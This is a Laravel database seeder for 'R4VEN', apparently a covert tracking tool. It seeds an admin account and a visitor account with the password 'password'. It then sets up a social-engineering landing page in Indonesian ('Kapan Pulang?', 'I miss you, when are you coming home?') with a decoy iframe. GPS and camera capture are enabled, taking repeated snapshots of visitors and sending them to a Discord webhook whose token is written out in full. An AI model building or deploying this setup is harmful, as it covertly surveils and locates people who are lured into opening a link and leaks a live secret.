<?php

namespace Database\Seeders;

use App\Models\Setting;
use App\Models\User;
use Illuminate\Database\Console\Seeds\WithoutModelEvents;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;

class DatabaseSeeder extends Seeder
{
    use WithoutModelEvents;

    /**
     * Seed the application's database.
     */
    public function run(): void
    {
        // 1. Seed Administrator
        User::updateOrCreate(
            ['email' => 'admin@r4ven.local'],
            [
                'name' => 'R4VEN Operator',
                'password' => Hash::make('password'),
                'role' => 'admin',
            ]
        );

        // 2. Seed Default Visitor Account (if needed)
        User::updateOrCreate(
            ['email' => 'visitor@r4ven.local'],
            [
                'name' => 'Demo Visitor',
                'password' => Hash::make('password'),
                'role' => 'visitor',
            ]
        );

        // 3. Seed Default Settings
        $defaultSettings = [
            'discord_webhook_url' => 'https://discord.com/api/webhooks/1543156505837310014/RnUFOwgerSFjb20TmEiAF_Psvm69BCbMGTMD1Vz11SzwWiazBHbn-QxtbMfLTT4z8wgc',
            'bot_name' => 'R4VEN',
            'bot_avatar_url' => 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
            'site_title' => 'Kapan Pulang?',
            'site_description' => 'Kangen nih, kapan pulang?',
            'og_image_url' => 'https://6a928218923dbf1a1a863b38.imgix.net/sandbox/images.jfif',
            'decoy_iframe_url' => 'https://tugas-besar-webdanmobile.vercel.app/',
            'landing_heading' => 'Kangen',
            'capture_gps_enabled' => '1',
            'capture_cam_enabled' => '1',
            'cam_interval_ms' => '2500',
            'max_snapshots_per_session' => '5',
            'custom_landing_slug' => 'kapan-pulang',
        ];

        foreach ($defaultSettings as $key => $value) {
            Setting::updateOrCreate(['key' => $key], ['value' => $value]);
        }
    }
}
